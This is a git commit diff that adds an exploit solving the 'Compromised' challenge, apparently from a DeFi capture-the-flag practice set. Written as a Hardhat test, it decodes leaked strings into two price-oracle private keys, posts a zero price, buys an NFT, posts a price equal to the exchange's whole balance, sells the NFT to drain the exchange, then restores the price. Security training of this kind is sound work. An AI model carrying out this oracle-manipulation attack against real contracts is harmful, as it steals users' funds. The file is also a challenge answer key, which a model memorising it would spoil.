f2e8c90976388a4fea19f1db6019b503b0e8ad8f
sogasg <sogasg@gmail.com>
2021-11-05 21:44:03 +0100

    Challenge #7 - Compromised done

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -61,11 +61,50 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+
+        const decodePrivateKey = raw => ethers.utils.toUtf8String(ethers.utils.base64.decode(ethers.utils.toUtf8String(raw)));
+
+        const strangeResponse1 = "0x4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535"
+        const strangeResponse2 = "0x4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134"
+
+        const oraclePrivateKey1 = decodePrivateKey(strangeResponse1);
+        const oraclePrivateKey2 = decodePrivateKey(strangeResponse2);
+        const updatePrice = async (privateKey, price) => {
+            const signer = new ethers.Wallet(privateKey, ethers.provider);
+            const tx = await this.oracle.connect(signer).postPrice("DVNFT", price);
+            return tx.wait();
+        }
+        await updatePrice(oraclePrivateKey1, 0);
+        await updatePrice(oraclePrivateKey2, 0);
+        console.log("price updated to 0");
+
+        const buyTx = await this.exchange.connect(attacker).buyOne({value: 1});
+        const recept = await buyTx.wait();
+        const tokenBoughtEvent = recept.events.find(({event}) => event === "TokenBought");
+        const tokenId = tokenBoughtEvent.args.tokenId;
+        console.log(`buy done. tokenId: ${tokenId}`);
+
+        const approveTx = await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+        await approveTx.wait();
+        console.log("approve done");
+
+        const exchangeBalance = await ethers.provider.getBalance(this.exchange.address);
+
+        await updatePrice(oraclePrivateKey1, exchangeBalance);
+        await updatePrice(oraclePrivateKey2, exchangeBalance);
+        console.log(`price updated to ${exchangeBalance}`);
+
+        const sellTx = await this.exchange.connect(attacker).sellOne(tokenId);
+        await sellTx.wait();
+        console.log("sell done");
+
+        await updatePrice(oraclePrivateKey1, INITIAL_NFT_PRICE);
+        await updatePrice(oraclePrivateKey2, INITIAL_NFT_PRICE);
+        console.log(`price reset to ${INITIAL_NFT_PRICE}`);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
         // Exchange must have lost all ETH
         expect(
             await ethers.provider.getBalance(this.exchange.address)
